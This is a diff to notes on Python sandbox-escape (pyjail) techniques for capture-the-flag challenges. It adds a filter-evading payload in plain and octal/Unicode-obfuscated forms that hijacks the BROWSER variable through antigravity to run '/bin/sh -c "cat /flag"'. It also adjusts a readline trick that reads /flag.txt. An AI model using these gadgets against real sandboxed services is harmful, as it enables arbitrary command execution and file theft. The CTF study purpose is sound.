@@ -170,8 +170,7 @@ sys.addaudithook((lambda x: lambda *_: x(1))(os._exit))
 # https://ur4ndom.dev/posts/2024-02-11-dicectf-quals-diligent-auditor/#fnref5
 # https://github.com/python/cpython/issues/115322
 import readline
-readline.read_history_file("/flag.txt")
-print(readline.get_history_item(1))
+readline.read_history_file("/flag.txt"), print(readline.get_history_item(1))
 
 import _posixsubprocess
 errpipe_read, errpipe_write = os.pipe()
@@ -330,7 +329,7 @@ print(delete_me) # error
     - `class cobj:...`
         - `obj = cobj()`
     - `type("cobj", (object,), {})()`
-        - `[].__class__.__class__("cobj", [].__class__.__bases__.__class__([[].__class__.__base__]), "".__class__.__dict__.copy().__class__())()`
+        - `[].__class__.__class__("cobj", [].__class__.__bases__.__class__([[].__class__.__base__]), {})()`
 
 ## CTF
 
@@ -742,7 +741,8 @@ print(eval(inp, fns, fns))
 ```
 - `solve.py`
 ```py
-# TBA
+# [setattr(__import__('os'), 'environ', {'BROWSER': '/bin/sh -c "cat /flag" #%s'}), __import__('antigravity')]
+[𝘴𝘦𝘵𝘢𝘵𝘵𝘳(__𝘪𝘮𝘱𝘰𝘳𝘵__('\\157\\163'), '\\145\\156\\166\\151\\162\\157\\156', {'\\102\\122\\117\\127\\123\\105\\122':'\\57\\142\\151\\156\\57\\163\\150\\40\\55\\143\\40\\42\\143\\141\\164\\40\\57\\146\\154\\141\\147\\42\\40\\43\\45\\163'}), __𝘪𝘮𝘱𝘰𝘳𝘵__('\\141\\156\\164\\151\\147\\162\\141\\166\\151\\164\\171')]
 ```
 
 ### Equinor CTF 2023: Dis is it!
